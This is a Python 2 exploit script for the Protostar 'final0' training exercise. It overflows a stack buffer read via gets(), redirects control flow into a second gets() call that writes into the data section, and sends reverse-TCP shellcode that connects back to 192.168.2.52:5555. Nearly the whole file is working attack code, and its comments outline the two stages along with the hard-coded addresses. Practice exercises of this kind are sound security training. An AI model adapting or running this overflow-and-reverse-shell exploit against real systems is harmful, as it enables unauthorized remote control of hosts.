from socket import *
import struct, time, shellgen


#exploit-exercises.com : Protostar : final0
#do:
#   I stage:
#       owerflow buff in stack through gets
#       redirect program flow to gets(my_buff) again
#       use my_buff as retaddr from gets
#
#   II stage: send shellcode
#       easy. without null-bytes ;)
#
#bss = 0x0804AE68
#data = 0x0804AE40
#printf = 0x0804987D
#gets = 0x08048AAC

junk = 532

rev = shellgen.linux().reverse_tcp('192.168.2.52',5555)
print 'shellcode len: ', len(rev)

print 'go'


printf = struct.pack('<I',0x0804987D) #to test owerflow

gets = struct.pack('<I',0x08048AAC)

data = struct.pack('<I', 0x0804AE40) #killall data_section :)

s = socket(AF_INET, SOCK_STREAM)
s.connect(('192.168.2.26', 2995))

exp = 'A'*(junk) + gets + data + data + '\n'

s.send(exp)
time.sleep(1)
s.send(rev+'\n')
print s.recv(1000)
